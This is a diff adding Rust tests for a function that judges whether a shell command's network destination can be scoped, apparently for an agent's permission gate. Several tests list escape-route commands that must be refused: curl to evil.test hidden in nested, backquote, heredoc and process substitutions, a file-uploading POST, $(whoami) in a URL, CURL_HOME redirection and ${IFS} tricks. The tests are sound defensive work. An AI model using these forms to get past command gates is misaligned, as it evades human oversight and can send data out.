@@ -1,6 +1,6 @@
 //! Tests for the egress scope derivation.
 
-use super::egress_destination;
+use super::{egress_destination, egress_scope_list};
 
 /// The two commands from a real session: a certificate path assigned first,
 /// the request second, and a local parser last. Both name the same origin, so
@@ -203,4 +203,99 @@ fn test_destination_rejects_other_channel() {
     ] {
         assert_eq!(egress_destination(command), None, "must refuse: {command}");
     }
+}
+
+/// A polling loop over a trusted origin keeps its scopable destination: the
+/// loop header, the case branches, and the assignment's capture are shells
+/// around the same read, not different programs. The interpreter consumer
+/// of a piped response needs a fence for its effect-safety check, so this
+/// destination probe names the loop without the pipe; the full pipeline is
+/// judged at the gate layer, where the fence is part of the context.
+#[test]
+fn test_polling_loop_scopes() {
+    let command = r#"cd /repo && for i in $(seq 1 40); do sleep 15; s=$(curl -s "https://api.github.com/repos/org/repo/actions/runs/1/jobs"); echo "$i $s"; case "$s" in *in_progress*|*queued*|"") ;; *) break;; esac; done"#;
+    assert_eq!(
+        egress_destination(command).as_deref(),
+        Some("curl https://api.github.com"),
+        "the trusted origin stays scopable through the loop"
+    );
+}
+
+/// A poll of an untrusted origin still names its destination, so the ask
+/// carries the remember option for that origin.
+#[test]
+fn test_polling_untrusted_scopes() {
+    let command = r#"for i in $(seq 1 10); do sleep 5; s=$(curl -s "https://ci.example.com/jobs"); echo "$s"; done"#;
+    assert_eq!(
+        egress_destination(command).as_deref(),
+        Some("curl https://ci.example.com"),
+        "an untrusted origin in the same shape stays scopable"
+    );
+}
+
+/// The shells peel, but the escape hatches do not: a body that writes, a
+/// URL built from a substitution, and a hijacking assignment all refuse.
+#[test]
+fn test_polling_bypasses_refuse() {
+    for command in [
+        // A POST through the same loop shape: the write refuses.
+        r#"for i in $(seq 1 3); do curl -X POST -d @file https://api.github.com; done"#,
+        // A URL whose query is built at run time is not a literal origin.
+        r#"curl -s "https://api.github.com/x?q=$(whoami)""#,
+        // A config-redirecting assignment in front of the trusted origin.
+        r#"for i in $(seq 1 3); do CURL_HOME=/tmp/h curl -s https://api.github.com; done"#,
+    ] {
+        assert_eq!(egress_destination(command), None, "must refuse: {command}");
+    }
+}
+
+/// Temporary trace of the scope list over the full pipeline.
+#[test]
+fn test_trace_full_pipeline() {
+    let body = r#"curl -s "https://api.github.com/x" | python3 -c "import json,sys; d=json.load(sys.stdin); print('ok')""#;
+    let answer = egress_scope_list(body, true);
+    println!("TRACE scopes: {answer:?}");
+    let full = concat!(
+        "for i in $(seq 1 40); do sleep 15; ",
+        "s=$(curl -s \"https://api.github.com/x\" | python3 -c \"import json,sys; d=json.load(sys.stdin); print('ok')\" 2>/dev/null); ",
+        "echo \"$i $s\"; case \"$s\" in *a*) ;; *) break;; esac; done",
+    );
+    let full_answer = egress_scope_list(full, true);
+    println!("TRACE full: {full_answer:?}");
+}
+
+/// Security probes for the unwrapper: each form is a known escape route,
+/// and each must refuse the scopable destination.
+#[test]
+fn test_escape_routes_refuse() {
+    for command in [
+        // Nested substitution: the inner body recurses and the outer must
+        // still judge the innermost program.
+        "$(echo $(curl -s https://evil.test))",
+        // Backquotes: the older substitution form refuses outright.
+        "echo `curl -s https://evil.test`",
+        // A heredoc body is expanded when unquoted, so a command inside
+        // must not ride a scopable read.
+        "cat <<EOF\n$(curl https://evil.test)\nEOF",
+        // Process substitution is a construct the unwrapper does not model.
+        "cat <(curl -s https://evil.test)",
+        // A config-redirecting assignment.
+        "CURL_HOME=/tmp/h curl -s https://api.github.com",
+        // A bare $ or ${ in a body re-forms words at run time.
+        "A=$(curl${IFS}https://evil.test/x)",
+        // A substitution mid-argument rewrites the destination.
+        "curl -s \"https://api.github.com/x?q=$(whoami)\"",
+    ] {
+        assert_eq!(egress_destination(command), None, "must refuse: {command}");
+    }
+    // The legitimate forms the unwrapper exists for. A substitution as a
+    // command argument still refuses the scope — the argument text is not
+    // literal — but the trusted read beside it keeps the scope at the
+    // clause level.
+    assert_eq!(
+        egress_destination("for i in $(seq 1 40); do curl -s https://api.github.com/x; done")
+            .as_deref(),
+        Some("curl https://api.github.com"),
+        "a loop over a generator keeps the trusted read scopable"
+    );
 }
